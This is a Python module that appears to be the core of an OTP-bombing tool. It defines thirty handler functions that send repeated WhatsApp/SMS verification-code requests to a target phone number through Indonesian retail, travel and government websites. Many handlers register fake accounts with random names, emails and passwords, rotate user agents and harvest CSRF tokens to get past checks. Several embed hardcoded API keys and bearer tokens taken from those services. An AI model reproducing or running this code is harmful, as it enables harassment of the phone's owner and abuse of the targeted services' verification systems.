#!/usr/bin/env python3
# handlers.py - 30+ OTP API Handlers

import requests
import json
import uuid
import random
import time
import re
from utils import fmt_08, fmt_plus, fmt_phone_only, random_ua

# ==================== OTP HANDLERS ====================

# 1. PINHOME
def send_pinhome(phone):
    try:
        url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
        payload = {"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":fmt_08(phone)}
        headers = {'Content-Type':'application/json','User-Agent':random_ua(),'Origin':'https://www.pinhome.id'}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code in [200, 201]
    except: return False

# 2. MAULAGI
def send_maulagi(phone):
    try:
        url = "https://api.maulagi.id/api/v2/auth/check"
        payload = {"credentials": fmt_08(phone)}
        headers = {'Content-Type':'application/json','x-ml-key':'C59RUHBU59','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except: return False

# 3. PLANETBAN
def send_planetban(phone):
    try:
        url = "https://api.planetban.com/website/customer/request-otp"
        payload = {"name":"Test","phone":fmt_08(phone),"password":"Test123","purpose":"register","method":"whatsapp"}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code < 400
    except: return False

# 4. DUNIAGAMES
def send_duniagames(phone):
    try:
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber":fmt_plus(phone),"userName":fmt_phone_only(phone)}
        headers = {'Content-Type':'application/json','x-device':str(uuid.uuid4()),'User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except: return False

# 5. TUNEUP
def send_tuneup(phone):
    try:
        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        data = {'company_name':f'PT {name.capitalize()}','owner_name':name.capitalize(),'address':'Jl. Test','email':f'{name}@mailnesia.com','phone_number':fmt_08(phone),'province_code':'32','city_code':'32.04','subscription_id':'undefined','channel':'whatsapp','agreement':'true','service_categories[]':'3'}
        headers = {'User-Agent':random_ua()}
        r = requests.post(url, data=data, headers=headers, timeout=10)
        return r.status_code < 400
    except: return False

# 6. INTERNET RAKYAT
def send_internetrakyat(phone):
    try:
        url = "https://internetrakyat.id/api/app/auth/send-otp-register"
        payload = {"phone_number": fmt_08(phone)}
        headers = {'Content-Type':'application/json','x-api-key':'280999!FTTH','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except: return False

# 7. ULTRAMILK
def send_ultramilk(phone):
    try:
        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
        name = 'User' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4))
        payload = {"name":name,"email":f"{name.lower()}@gmail.com","password":"Pass123!","phone_number":fmt_phone_only(phone),"portal":"IcownicPatch","is_consent":True}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code in [200, 201]
    except: return False

# 8. JEMBATANI
def send_jembatani(phone):
    try:
        phone_08 = fmt_08(phone)
        name = 'User' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        password = 'Pass' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
        url = "https://api.jembatani.co.id/v1/register"
        payload = {"phone_number":phone_08,"name":name,"role":"farmer","password":password,"password_confirmation":password,"consent":"1"}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        if r.status_code == 200 or 'success' in r.text.lower():
            return True
        r2 = requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json={"phone_number":phone_08}, headers=headers, timeout=10)
        return r2.status_code < 400
    except: return False

# 9. AUTO2000
def send_auto2000(phone):
    try:
        url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
        payload = {"phoneNumber":fmt_08(phone),"isCheckOtpLimit":True,"uniqueID":fmt_08(phone),"isLogin":False}
        headers = {'Content-Type':'application/json','User-Agent':random_ua(),'Origin':'https://auto2000.co.id'}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'acknowledge' in r.text.lower()
    except: return False

# 10. ROYAL CANIN
def send_royalcanin(phone):
    try:
        sess = requests.Session()
        sess.get("https://club.royalcanin.id/sign-up", headers={'User-Agent':random_ua()}, timeout=10)
        url = "https://club.royalcanin.id/api/get_otp"
        payload = {"params": {"Email": "", "mobile_number": fmt_plus(phone), "OTPType": "IM"}}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except: return False

# 11. WATSONS
def send_watsons(phone):
    try:
        url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
        payload = {"uid":"","action":"GENERAL","countryCode":"62","target":fmt_phone_only(phone),"type":"WHATSAPP"}
        headers = {'Content-Type':'application/json','Authorization':'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'token' in r.text.lower()
    except: return False

# 12. 99.CO
def send_99co(phone):
    try:
        sess = requests.Session()
        sess.get("https://www.99.co/id", headers={'User-Agent':random_ua()}, timeout=10)
        token = sess.cookies.get("_99-acs-token", "")
        if not token:
            return False
        url = "https://www.99.co/id/api/biz/messaging/otp-events"
        payload = {"brand":"99id","destination_address":fmt_plus(phone),"type_id":2}
        headers = {'Content-Type':'application/json','Authorization':f'Bearer {token}','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except: return False

# 13. BELIRUMAH
def send_belirumah(phone):
    try:
        url = "https://api.belirumah.co/api/otp/request_new"
        payload = {"phone_number": fmt_plus(phone)}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'success' in r.text.lower()
    except: return False

# 14. FASTWORK
def send_fastwork(phone):
    try:
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        payload = {"phone_number": fmt_08(phone)}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'reference_code' in r.text.lower()
    except: return False

# 15. BEAUTYHAUL
def send_beautyhaul(phone):
    try:
        sess = requests.Session()
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        reg_payload = {"nama_depan":name,"nama_belakang":name,"email":email,"nomor_kode_id":"100","nomor_kode_value":"62","nomor_ponsel":fmt_phone_only(phone),"password":"Testt#12334","konfirmasi_password":"Testt#12334","tanggal_lahir":"20 Jun 2015","jenis_kelamin":random.choice(["Female","Male"]),"g-recaptcha-response":"","subscribe":"true","terms":"true"}
        sess.post("https://www.beautyhaul.com/ajax/account/save_register", json=reg_payload, headers={'User-Agent':random_ua()}, timeout=10)
        r = sess.post("https://www.beautyhaul.com/ajax/account/send_otp", json={"method":"WhatsApp"}, headers={'User-Agent':random_ua()})
        return r.status_code == 200
    except: return False

# 16. HAINAYA
def send_hainaya(phone):
    try:
        phone_clean = fmt_phone_only(phone)
        url = "https://app.hainaya.id/api/onboarding/register"
        business_name = 'Test' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)).capitalize() + str(random.randint(10,99))
        payload = {"business_name":business_name,"vertical":"salon","vendor_type":"nail_salon","business_phone":phone_clean,"owner_name":"","owner_phone":phone_clean}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        if r.status_code == 201 or 'otp' in r.text.lower():
            return True
        if r.status_code == 409:
            r2 = requests.post("https://app.hainaya.id/api/auth/login", json={"phone_number":phone_clean}, headers=headers, timeout=10)
            return r2.status_code == 200
        return False
    except: return False

# 17. MINUMYUKKAKA
def send_minumyukkaka(phone):
    try:
        sess = requests.Session()
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        password = 'pass#' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=4))
        reg_data = {"registerModel[first_name]":name,"registerModel[last_name]":"","registerModel[email]":email,"registerModel[phone]":phone_08,"registerModel[otp]":"","registerModel[gender]":"","registerModel[date_of_birth]":"","registerModel[IsAddressRequired]":"false","registerModel[address]":"","registerModel[additional_address]":"","registerModel[city]":"","registerModel[zip]":"","registerModel[country_code]":"","registerModel[country]":"","registerModel[state]":"","registerModel[password]":password,"registerModel[verify_password]":password,"registerModel[pin]":"","registerModel[verify_pin]":""}
        sess.post("https://minumyukkaka.com/services/liquid/Register", data=reg_data, headers={'User-Agent':random_ua()}, timeout=10)
        x_sat = sess.cookies.get('x-sat', '') or ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=', k=44))
        url = "https://minumyukkaka.com/services/identity/requestOTP"
        data = {"destination":phone_08,"otpLength":"6"}
        headers = {'x-sat':x_sat,'Content-Type':'application/x-www-form-urlencoded','User-Agent':random_ua()}
        r = requests.post(url, data=data, headers=headers, timeout=10)
        return r.status_code == 200 or 'success' in r.text.lower()
    except: return False

# 18. SIDEMANG
def send_sidemang(phone):
    try:
        url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
        email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) + str(random.randint(100,999)) + '@gmail.com'
        payload = {"phoneNumber": fmt_08(phone), "email": email}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'otpDispatched' in r.text.lower()
    except: return False

# 19. PTSP KEMENAG
def send_ptspkemenag(phone):
    try:
        url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        chars = list('abcdefghijklmnopqrstuvwxyz0123456789')
        random.shuffle(chars)
        password = 'Pass' + ''.join(chars[:6]) + '$'
        payload = {"nama":name,"wa":fmt_08(phone),"email":email,"password":password}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'success' in r.text.lower()
    except: return False

# 20. ERAFONE
def send_erafone(phone):
    try:
        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
        payload = {"identifier": fmt_plus(phone), "type": "identifier_validation"}
        headers = {'Content-Type':'application/json','Authorization':'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=','otp-provider':'whatsapp','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except: return False

# 21. KLOOK
def send_klook(phone):
    try:
        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
        payload = {"action":"login_register","type":1,"rcv":fmt_plus(phone),"is_resend":False,"payload":{"mobile":fmt_plus(phone),"term_ids":[330],"mobile_token":"","invite_code":""},"_rc":"","rcv_token":""}
        headers = {'Content-Type':'application/json','User-Agent':random_ua(),'x-platform':'mobile'}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except: return False

# 22. KANIVA
def send_kaniva(phone):
    try:
        sess = requests.Session()
        phone_08 = fmt_08(phone)
        name = 'User' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", headers={'User-Agent':random_ua()}, timeout=10)
        csrf = sess.cookies.get("XSRF-TOKEN", "")
        if not csrf:
            return False
        url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
        payload = {"name": name, "phone": phone_08}
        headers = {'X-XSRF-TOKEN':csrf,'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'success' in r.text.lower()
    except: return False

# 23. RCX
def send_rcx(phone):
    try:
        sess = requests.Session()
        phone_08 = fmt_08(phone)
        name = 'User' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        email = f"{name.lower()}@gmail.com"
        sess.get("https://sso.rcx.co.id/register", headers={'User-Agent':random_ua()}, timeout=10)
        token = sess.cookies.get("XSRF-TOKEN", "")
        if not token:
            return False
        url = "https://sso.rcx.co.id/auth/passwordless/request"
        data = {"_token":token,"mode":"register","channel":"whatsapp","name":name,"email":email,"identifier":phone_08}
        headers = {'Content-Type':'application/x-www-form-urlencoded','User-Agent':random_ua()}
        r = requests.post(url, data=data, headers=headers, timeout=10)
        return r.status_code == 302 or r.status_code < 400
    except: return False

# 24. SAHABAT TEKNISI
def send_sahabat(phone):
    try:
        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
        payload = {"phone": fmt_08(phone)}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'success' in r.text.lower()
    except: return False

# 25. ASTRA DAIHATSU
def send_astra(phone):
    try:
        sess = requests.Session()
        sess.get("https://www.astra-daihatsu.id/register", headers={'User-Agent':random_ua()}, timeout=10)
        csrf = sess.cookies.get("csrf-token", "")
        if not csrf:
            return False
        url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
        payload = {"phoneNo": fmt_phone_only(phone)}
        headers = {'Content-Type':'application/json','csrftoken':csrf,'User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'success' in r.text.lower()
    except: return False

# 26. HASHMICRO
def send_hashmicro(phone):
    try:
        url = "https://website-api.hashmicro.com/api/add/3"
        name = 'User' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        data = {'fullname':name,'phonenumber':fmt_08(phone),'email':f"{name.lower()}@gmail.com",'companyname':f'PT {name}','medium':'55','source':'143'}
        headers = {'Content-Type':'application/x-www-form-urlencoded','User-Agent':random_ua()}
        r = requests.post(url, data=data, headers=headers, timeout=10)
        return r.status_code == 200 or 'success' in r.text.lower()
    except: return False

# 27. HRS-BRE
def send_hrsbre(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://career.hrs-bre.site/auth/sign_up_action"
        nik = ''.join(random.choices('0123456789', k=16))
        email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + '@gmail.com'
        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        password = 'Aa1' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#$%&!', k=7))
        boundary = '----WebKitFormBoundary' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
        body = f'--{boundary}\r\nContent-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n--{boundary}\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email}\r\n--{boundary}\r\nContent-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n--{boundary}\r\nContent-Disposition: form-data; name="username"\r\n\r\n{username}\r\n--{boundary}\r\nContent-Disposition: form-data; name="password"\r\n\r\n{password}\r\n--{boundary}--\r\n'
        headers = {'Content-Type':f'multipart/form-data; boundary={boundary}','User-Agent':random_ua()}
        r = requests.post(url, data=body, headers=headers, timeout=10)
        return r.status_code < 400 or 'success' in r.text.lower()
    except: return False

# 28. LAPORMASBUP
_registered = {}
def send_lapormasbup(phone):
    try:
        global _registered
        phone_08 = fmt_08(phone)
        if phone_08 in _registered:
            url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
            headers = {'Content-Type':'application/json','User-Agent':random_ua()}
            r = requests.post(url, json={"mobilephone": phone_08}, headers=headers, timeout=10)
            return r.status_code == 200 or 'berhasil' in r.text.lower()
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        password = 'Pass' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=4)) + '$'
        url = "https://lapormasbup.klaten.go.id/api/register"
        payload = {"name":name,"email":email,"mobilephone":phone_08,"gender":random.choice(['Laki-Laki','Perempuan']),"warga_birth_date":f"{random.randint(1966,2010)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}","password":password,"address":"Jl. Test No. " + str(random.randint(1,200))}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        if r.status_code == 200 or 'berhasil' in r.text.lower():
            _registered[phone_08] = True
            return True
        return False
    except: return False

# 29. BONUS BELANJA
def send_bonusbelanja(phone):
    try:
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        payload = {"phone": fmt_08(phone), "name": "User", "agreeTnc": True, "agreeContact": True}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'error":false' in r.text.lower()
    except: return False

# 30. MATAHARI
def send_matahari(phone):
    try:
        url = "https://matahari-backend-prod.matahari.com/api/auth/register"
        name = 'User' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4))
        payload = {"emailAddress":f"{name.lower()}@gmail.com","name":name,"mobileCountryCode":"","mobileNumber":fmt_08(phone),"birthDate":"2000-01-01","genderId":"1","password":"Pass123!","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}
        headers = {'Content-Type':'application/json','User-Agent':random_ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200 or 'otp' in r.text.lower()
    except: return False

# ==================== ALL HANDLERS ====================
ALL_HANDLERS = {
    'pinhome': send_pinhome,
    'maulagi': send_maulagi,
    'planetban': send_planetban,
    'duniagames': send_duniagames,
    'tuneup': send_tuneup,
    'internetrakyat': send_internetrakyat,
    'ultramilk': send_ultramilk,
    'jembatani': send_jembatani,
    'auto2000': send_auto2000,
    'royalcanin': send_royalcanin,
    'watsons': send_watsons,
    '99co': send_99co,
    'belirumah': send_belirumah,
    'fastwork': send_fastwork,
    'beautyhaul': send_beautyhaul,
    'hainaya': send_hainaya,
    'minumyukkaka': send_minumyukkaka,
    'sidemang': send_sidemang,
    'ptspkemenag': send_ptspkemenag,
    'erafone': send_erafone,
    'klook': send_klook,
    'kaniva': send_kaniva,
    'rcx': send_rcx,
    'sahabat': send_sahabat,
    'astra': send_astra,
    'hashmicro': send_hashmicro,
    'hrsbre': send_hrsbre,
    'lapormasbup': send_lapormasbup,
    'bonusbelanja': send_bonusbelanja,
    'matahari': send_matahari,
}

def get_all_handlers():
    return ALL_HANDLERS

def get_handler(name):
    return ALL_HANDLERS.get(name)
